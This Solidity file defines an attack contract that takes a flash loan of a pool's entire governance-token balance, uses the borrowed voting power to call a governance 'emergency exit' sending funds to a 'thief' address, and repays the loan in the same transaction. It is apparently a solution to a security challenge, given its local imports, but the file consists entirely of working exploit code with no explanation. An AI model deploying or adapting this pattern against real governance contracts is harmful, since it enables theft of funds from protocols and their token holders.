// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GovToken.sol";
import "./FlashLoanPool.sol";

interface IGovernance {
    function executeEmergencyExit(address payable to) external;
}

contract AttackContract is IFlashLoanReceiver {
    GovToken public token;
    FlashLoanPool public pool;
    IGovernance public governance;
    address payable public thief;

    constructor(address _token, address _pool, address _governance, address payable _thief) {
        token = GovToken(_token);
        pool = FlashLoanPool(_pool);
        governance = IGovernance(_governance);
        thief = _thief;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(pool), "only pool");
        governance.executeEmergencyExit(thief);
        token.transfer(address(pool), amount);
    }
}
